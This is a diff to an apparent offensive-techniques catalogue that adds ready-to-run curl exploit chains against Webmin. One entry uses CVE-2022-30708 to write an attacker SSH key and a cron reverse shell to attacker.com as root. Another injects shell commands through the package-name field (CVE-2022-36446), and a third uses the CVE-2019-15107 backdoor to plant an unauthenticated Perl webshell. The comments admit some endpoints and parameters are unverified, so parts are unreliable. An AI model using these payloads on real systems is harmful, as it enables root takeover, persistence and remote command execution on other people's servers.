@@ -102,6 +102,31 @@ functions:
       unauthenticated:
     version: |
       1.890 (backdoored SourceForge release)
+  - code: "# CVE-2022-30708: authenticated arbitrary file write via settings-editor_write.cgi\n\
+      # The `file` parameter is not restricted \u2014 write any file as root\n# Step\
+      \ 1: authenticate\nSID=$(curl -sk -c /tmp/wm.jar -X POST \"https://victim.com:10000/session_login.cgi\"\
+      \ \\\n  -d \"page=%2F&user=<webmin_user>&pass=<webmin_pass>\" \\\n  -D - | grep\
+      \ -oP '(?<=sid=)[^;]+')\n\n# Step 2: write an SSH authorized_keys file for persistent\
+      \ root access\ncurl -sk -b \"sid=${SID}\" \\\n  -X POST \"https://victim.com:10000/settings-editor_write.cgi\"\
+      \ \\\n  --data-urlencode \"file=/root/.ssh/authorized_keys\" \\\n  --data-urlencode\
+      \ \"data=ssh-ed25519 AAAA...attacker_pubkey... attacker\"\n\n# Or write a cron\
+      \ backdoor:\ncurl -sk -b \"sid=${SID}\" \\\n  -X POST \"https://victim.com:10000/settings-editor_write.cgi\"\
+      \ \\\n  --data-urlencode \"file=/etc/cron.d/backdoor\" \\\n  --data-urlencode\
+      \ \"data=* * * * * root bash -i >& /dev/tcp/attacker.com/12345 0>&1\"\n"
+    comment: "CVE-2022-30708 (CVSS 8.8): The settings-editor_write.cgi script does\
+      \ not restrict\nthe `file` path parameter, allowing an authenticated Webmin\
+      \ user to write arbitrary\ncontent to any filesystem path. Since Webmin runs\
+      \ as root, any file is writable.\nAffects Webmin through 1.991 when users are\
+      \ manually created (not via Virtualmin).\nUseful for SSH key injection, cron-based\
+      \ persistence, or overwriting system files.\n\n\u26A0\uFE0F Unverified payload:\
+      \ parameter names (`file`, `data`) and endpoint path are\nderived from the CVE\
+      \ description, not tested against a live instance. Cross-check\nagainst the\
+      \ source or a lab environment before use.\n"
+    contexts:
+      authenticated:
+    platform: linux
+    version: |-
+      <= 1.991
   rce:
   - code: |
       # CVE-2019-15107: unauthenticated RCE via backdoor in password_change.cgi
@@ -123,6 +148,35 @@ functions:
       unauthenticated:
     version: |
       1.890 (backdoored SourceForge release)
+  - code: |
+      # CVE-2022-36446: authenticated RCE via Software Package Updates module (CVSS 10.0)
+      # Step 1: obtain a session cookie
+      SID=$(curl -sk -c /tmp/wm.jar -X POST "https://victim.com:10000/session_login.cgi" \
+        -d "page=%2F&user=<webmin_user>&pass=<webmin_pass>" \
+        -D - | grep -oP '(?<=sid=)[^;]+')
+
+      # Step 2: inject a command via the package name field passed to apt-get/yum
+      curl -sk -b "sid=${SID}" \
+        -X POST "https://victim.com:10000/software/apt-lib.pl" \
+        --data-urlencode "u=nmap;id>/tmp/pwned" \
+        --data-urlencode "search=1"
+
+      # Verify:
+      curl -sk -b "sid=${SID}" "https://victim.com:10000/software/apt-lib.pl?u=nmap;cat+/tmp/pwned&search=1"
+    comment: "CVE-2022-36446 (CVSS 10.0): Webmin's Software Package Updates module\
+      \ passes the\npackage name parameter directly to a shell command (apt-get/yum)\
+      \ without sanitisation.\nInjecting shell metacharacters achieves OS command\
+      \ execution as root (Webmin's daemon\nuser). Requires only a valid Webmin user\
+      \ with access to the module \u2014 not full admin.\nRef: https://github.com/p0dalirius/CVE-2022-36446-Webmin-Software-Package-Updates-RCE\n\
+      ExploitDB: 50998\n\n\u26A0\uFE0F Unverified payload: the endpoint (`/software/apt-lib.pl`)\
+      \ and parameter names\n(`u`, `search`) are derived from advisory descriptions,\
+      \ not verified against the\npublic PoC. Cross-check the exact request format\
+      \ against the p0dalirius PoC linked\nabove before use.\n"
+    contexts:
+      authenticated:
+    platform: linux
+    version: |-
+      < 1.997
   - code: |
       # Admin RCE via Webmin Terminal (Tools > Terminal)
       # Navigate to: https://victim.com:10000/terminal/index.cgi
@@ -182,4 +236,29 @@ functions:
     listener: tcp-server
     platform: linux
     tty: false
+  webshell:
+  - code: |
+      # CVE-2019-15107: write a Perl CGI webshell to the Webmin htdocs directory
+      # miniserv.pl executes .cgi files placed under /usr/share/webmin/
+      curl -sk -X POST "https://victim.com:10000/password_change.cgi" \
+        --data-urlencode "user=root" \
+        --data-urlencode "pam=" \
+        --data-urlencode "expired=2" \
+        --data-urlencode 'old=printf "#!/usr/bin/perl\nuse CGI;my \$q=CGI->new;print \$q->header;print qx(\$q->param(\"c\"));" > /usr/share/webmin/shell.cgi && chmod +x /usr/share/webmin/shell.cgi' \
+        --data-urlencode "new1=x" \
+        --data-urlencode "new2=x"
+
+      # Access the webshell (no authentication required by default):
+      curl -sk "https://victim.com:10000/shell.cgi?c=id"
+    comment: |
+      CVE-2019-15107: uses the backdoor to write a Perl CGI webshell to
+      /usr/share/webmin/. Webmin's miniserv.pl serves and executes .cgi files
+      from that directory directly. The webshell runs as root (Webmin's daemon
+      user). Access requires no authentication by default.
+      Access at: https://victim.com:10000/shell.cgi?c=id
+    contexts:
+      unauthenticated:
+    platform: linux
+    version: |
+      1.890 (backdoored SourceForge release)
 ...
